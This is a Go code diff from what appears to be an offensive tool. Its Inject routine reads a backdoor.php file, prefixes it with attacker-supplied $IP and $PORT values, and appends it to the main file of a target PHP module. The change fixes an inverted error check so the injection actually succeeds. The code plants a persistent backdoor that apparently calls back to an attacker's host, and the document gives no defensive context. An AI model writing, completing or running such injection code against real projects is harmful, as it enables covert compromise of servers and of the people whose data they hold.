@@ -2,14 +2,15 @@ package internals
 
 import (
 	"fmt"
+	"os"
 	"strings"
 
 	"data"
 	"utils"
 )
 
-func addAddress(addr data.Address, file *string) {
-	*file = "$IP='" + addr.Ip + "';$PORT=" + fmt.Sprintf("%d", addr.Port) + ";" + *file
+func addAddressToString(addr data.Address, str *string) {
+	*str = "$IP='" + addr.Ip + "';$PORT=" + fmt.Sprintf("%d", addr.Port) + ";" + *str
 }
 
 func findModuleName(path string) string {
@@ -18,8 +19,8 @@ func findModuleName(path string) string {
 }
 
 func Inject(addr data.Address, path string) error {
-	const backdoorPath string = "../backdoor.php"
-	var mainFilePath string
+	currentDirectory, _ := os.Getwd()
+	var backdoorPath string = currentDirectory + "/backdoor.php"
 	var moduleName string = findModuleName(path)
 
 	mainFile, err := findMainFileDirectory(path, moduleName)
@@ -27,14 +28,14 @@ func Inject(addr data.Address, path string) error {
 		return err
 	}
 
-	mainFilePath = path + "/" + mainFile
+	mainFilePath := path + "/" + mainFile
 	return injectBackDoor(addr, mainFilePath, backdoorPath)
 }
 
 func injectBackDoor(addr data.Address, filePath string, backdoorPath string) error {
 	backdoor, err := utils.ReadFile(backdoorPath)
-	if err != nil {
-		addAddress(addr, &backdoor)
+	if err == nil {
+		addAddressToString(addr, &backdoor)
 		err = utils.AppendToFile(backdoor, filePath)
 	}
 
